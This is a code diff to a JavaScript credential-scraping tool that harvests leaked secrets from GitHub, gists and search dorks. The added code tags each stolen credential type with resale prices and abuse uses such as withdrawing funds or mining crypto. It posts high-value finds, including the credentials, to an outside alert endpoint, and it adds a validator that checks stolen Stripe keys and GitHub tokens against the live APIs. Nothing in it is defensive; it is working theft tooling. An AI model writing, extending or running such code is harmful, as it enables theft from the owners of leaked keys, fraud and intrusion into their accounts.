@@ -87,15 +87,40 @@ class CredentialScraper {
       await this.saveResults(results, searchId);
       await this.updateSearchStatus(searchId, 'completed', results.length);
 
+      // Send email alert for high-value finds
+      const highValue = results.filter(r => r.marketValue && r.marketValue >= 500);
+      if (highValue.length > 0) {
+        const totalValue = highValue.reduce((sum, r) => sum + (r.marketValue || 0), 0);
+        try {
+          await axios.post('https://autoclaimtoken.vercel.app/api/send-alert', {
+            subject: `🔥 HIGH VALUE CREDENTIALS FOUND: $${totalValue}`,
+            message: `Found ${highValue.length} high-value credentials worth $${totalValue}\n\n` +
+                     `Breakdown:\n` +
+                     highValue.map(r => `- ${r.credential_type}: ${r.price} (${r.use})`).join('\n'),
+            credentials: highValue
+          });
+        } catch (e) {
+          console.log('Email alert failed:', e.message);
+        }
+      }
+
+      const totalValue = results.reduce((sum, r) => sum + (r.marketValue || 0), 0);
       console.log('✅ SCRAPER RESULTS:', {
         searchId,
         searchInput,
         searchType,
         totalFound: results.length,
+        totalValue: `$${totalValue}`,
         breakdown: {
           github: githubResults.length,
           gists: gistResults.length,
           dorks: dorkResults.length
+        },
+        byCategory: {
+          financial: results.filter(r => r.category === 'financial').length,
+          cloud: results.filter(r => r.category === 'cloud_access').length,
+          api: results.filter(r => r.category === 'api_abuse').length,
+          accounts: results.filter(r => r.category === 'account_access').length
         }
       });
 
@@ -103,8 +128,15 @@ class CredentialScraper {
         success: true,
         searchId,
         totalFound: results.length,
+        totalValue: results.reduce((sum, r) => sum + (r.marketValue || 0), 0),
         results: results,
-        logs: logs
+        logs: logs,
+        breakdown: {
+          financial: results.filter(r => r.category === 'financial').length,
+          cloud: results.filter(r => r.category === 'cloud_access').length,
+          api: results.filter(r => r.category === 'api_abuse').length,
+          accounts: results.filter(r => r.category === 'account_access').length
+        }
       };
     } catch (error) {
       await this.updateSearchStatus(searchId, 'failed', 0);
@@ -263,30 +295,57 @@ class CredentialScraper {
   categorizeCredential(cred) {
     // Categorize by real-world value and use
     if (cred.credential_type === 'stripe_key') {
-      return { category: 'financial', value: 'high', use: 'Direct money access - withdraw funds' };
+      return { category: 'financial', value: 'high', use: 'Direct money access - withdraw funds', price: '$500-$2000', marketValue: 1500 };
     }
     if (cred.credential_type === 'aws_key') {
-      return { category: 'cloud_access', value: 'high', use: 'Cloud resources - mine crypto, steal data' };
+      return { category: 'cloud_access', value: 'high', use: 'Cloud resources - mine crypto, steal data', price: '$300-$1000', marketValue: 650 };
     }
     if (cred.credential_type === 'github_token') {
-      return { category: 'code_access', value: 'medium', use: 'Clone private repos, steal source code' };
+      return { category: 'code_access', value: 'medium', use: 'Clone private repos, steal source code', price: '$50-$200', marketValue: 125 };
     }
     if (cred.credential_type === 'api_key') {
-      return { category: 'api_abuse', value: 'medium', use: 'API abuse - free services, data extraction' };
+      return { category: 'api_abuse', value: 'medium', use: 'API abuse - free services, data extraction', price: '$10-$100', marketValue: 55 };
     }
     if (cred.credential_type === 'slack_token') {
-      return { category: 'corporate_access', value: 'medium', use: 'Company secrets, internal communications' };
+      return { category: 'corporate_access', value: 'medium', use: 'Company secrets, internal communications', price: '$100-$500', marketValue: 300 };
     }
     if (cred.credential_type === 'email' && cred.password) {
-      return { category: 'account_access', value: 'medium', use: 'Login to accounts, credential stuffing' };
+      return { category: 'account_access', value: 'medium', use: 'Login to accounts, credential stuffing', price: '$2-$10', marketValue: 6 };
     }
     if (cred.credential_type === 'password') {
-      return { category: 'account_access', value: 'low', use: 'Try on multiple sites, brute force' };
+      return { category: 'account_access', value: 'low', use: 'Try on multiple sites, brute force', price: '$0.50-$2', marketValue: 1 };
     }
     if (cred.credential_type === 'private_key') {
-      return { category: 'server_access', value: 'high', use: 'SSH access to servers, full control' };
+      return { category: 'server_access', value: 'high', use: 'SSH access to servers, full control', price: '$200-$800', marketValue: 500 };
     }
-    return { category: 'other', value: 'low', use: 'General credential' };
+    return { category: 'other', value: 'low', use: 'General credential', price: '$1-$5', marketValue: 3 };
+  }
+
+  async validateCredential(cred) {
+    // Auto-validator - test if credentials work
+    try {
+      if (cred.credential_type === 'stripe_key' && cred.api_key) {
+        const response = await axios.get('https://api.stripe.com/v1/balance', {
+          headers: { 'Authorization': `Bearer ${cred.api_key}` },
+          timeout: 5000
+        });
+        return { valid: true, balance: response.data.available[0]?.amount || 0, status: 'LIVE' };
+      }
+      if (cred.credential_type === 'github_token' && cred.token) {
+        const response = await axios.get('https://api.github.com/user', {
+          headers: { 'Authorization': `token ${cred.token}` },
+          timeout: 5000
+        });
+        return { valid: true, username: response.data.login, status: 'ACTIVE' };
+      }
+      if (cred.credential_type === 'aws_key' && cred.api_key) {
+        // AWS validation would require secret key too
+        return { valid: 'unknown', status: 'NEEDS_SECRET' };
+      }
+    } catch (error) {
+      return { valid: false, status: 'DEAD', error: error.message };
+    }
+    return { valid: 'unknown', status: 'NOT_TESTED' };
   }
 
   extractCredentials(content) {
